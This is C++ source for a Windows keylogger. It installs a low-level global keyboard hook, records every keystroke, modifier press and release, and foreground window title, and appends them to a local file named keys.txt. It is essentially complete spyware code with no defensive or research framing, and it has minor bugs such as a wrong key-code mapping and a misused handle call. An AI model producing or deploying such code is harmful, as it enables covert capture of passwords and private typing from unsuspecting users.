#include <Windows.h>
#include <chrono>

#include "write.h"

#define KFILE "keys.txt"

bool shifted = false;
bool ctrled = false;
bool alted = false;
bool capslock = false;

HWND curr_window;
HWND old_curr_window;

LRESULT CALLBACK KProc(int nCode, WPARAM wParam, LPARAM lParam) {
    old_curr_window = curr_window;
    curr_window = GetForegroundWindow();

    if (curr_window != old_curr_window){
        LPTSTR wintext = (LPTSTR) malloc(256);
        GetWindowText(curr_window, wintext, 256);
        std::string winout = "Window Changed: ";

        winout.append(std::string((char*) wintext));

        write_pendl(winout, KFILE);
        wnewline(KFILE); 
    }
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT) (lParam);
    
    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN){

        switch(p->vkCode){
            case VK_SHIFT:
            case VK_LSHIFT:
            case VK_RSHIFT:
                if (!shifted) write("<SHIFT>", KFILE);
                shifted = true;
                break;

            case VK_MENU: //alt
                if (!alted) write("<ALT>", KFILE);
                alted = true;
                break;

            case VK_CAPITAL:
                if (!capslock) write("<CAPS LOCK>", KFILE);
                capslock = true;
                break;

            case VK_CONTROL:
            case VK_LCONTROL:
            case VK_RCONTROL:
                if (!ctrled) write("<CTRL>", KFILE);
                ctrled = true;
                break;

            case VK_BACK:
                write("<BACKSPACE>", KFILE);
                break;

            case VK_DELETE:
                write("<DELETE>", KFILE);
                break;

            case VK_ESCAPE:
                write("<ESC>", KFILE);
                break;

            case VK_OEM_COMMA:
                write(",", KFILE);
                break;

            case VK_OEM_PERIOD:
                write(".", KFILE);
                break;

            case VK_RETURN:
                write_endl("<RETURN>", KFILE);
                break;

            case 49:
                if (shifted) write("@", KFILE);
                else write("2", KFILE);
                break;

            default:
                char out;
                if (shifted){
                    out = char(p->vkCode);
                }else {
                    out = char(tolower(p->vkCode));
                }
                write(out, KFILE);
        }
    }

    if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP){
        switch (p->vkCode){
            case VK_SHIFT:
            case VK_LSHIFT:
            case VK_RSHIFT:
                write_endl("<SHIFT RELEASE>", KFILE);
                shifted = false;
                break;

            case VK_MENU: //alt
                write_endl("<ALT RELEASE>", KFILE);
                alted = false;
                break;

            case VK_CONTROL:
            case VK_LCONTROL:
            case VK_RCONTROL:
                write_endl("<CTRL RELEASE>", KFILE);
                ctrled = false;
                break;
        }
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void init_klogd(){
    curr_window = GetForegroundWindow();

    HHOOK khook = SetWindowsHookExA(WH_KEYBOARD_LL, KProc, NULL, 0);

    if (khook == NULL){
        std::cout << ("Error: Keyboard hook could not be installed") << std::endl;
    }else {
        // CreateFileA(KFILE, );
        std::string readymsg = "Ready on ";
        auto currtime_funk = std::chrono::system_clock::now();
        std::time_t currtime_time_t = std::chrono::system_clock::to_time_t(currtime_funk);
        auto currtime = std::ctime(&currtime_time_t);

        readymsg.append(currtime);
        write_endl(readymsg, KFILE);
        MSG msg = {0, 0, 0, 0, 0, 0, 0};
        while (GetMessageA(&msg, NULL, 0, 0) != WM_QUIT) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);

         }
    }

    
    UnhookWindowsHookEx(khook);
    CloseHandle(khook);
}